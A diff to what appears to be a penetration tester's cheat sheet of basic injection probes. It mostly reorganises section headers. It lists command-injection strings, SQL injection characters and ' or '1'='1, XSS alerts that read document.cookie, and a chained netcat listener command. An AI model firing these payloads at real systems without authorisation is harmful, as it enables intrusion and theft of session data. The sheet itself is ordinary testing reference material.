@@ -1,4 +1,7 @@
-####command injection#####
+==## 2 - INTR ##==
+
+
+--# command injection #--
 -h #Linux help
 /? #win
 PARAM ; echo Command injected
@@ -9,16 +12,15 @@ echo Injected| #perl
 
 %00 #this is null value for url-encode
 
-#SQL
+--# SQL #--
 '  "  `  % %% -- /*  // )  ;
 #do any of these values get sanitized?
--- #this tells sql db to ignore everything to the right; ex UPDATE table set name ='test'-- WHERE id=xx
+-- #this tells sql db to ignore everything to the right;
+   #ex UPDATE table set name ='test'-- WHERE id=xx
 
 ' or '1'='1 #basic test to see if it will dump db
 
-
-
-#
+--# JS #--
 <script>alert(document.domain);</script>
 <script>alert(document.cookie);</script>
 
@@ -39,4 +41,4 @@ echo Injected| #perl
 #is nc on the system? stuff can be done with that
 127.0.0.1 && nc -l -p 8080
 
-####xss####
+--# XSS #--
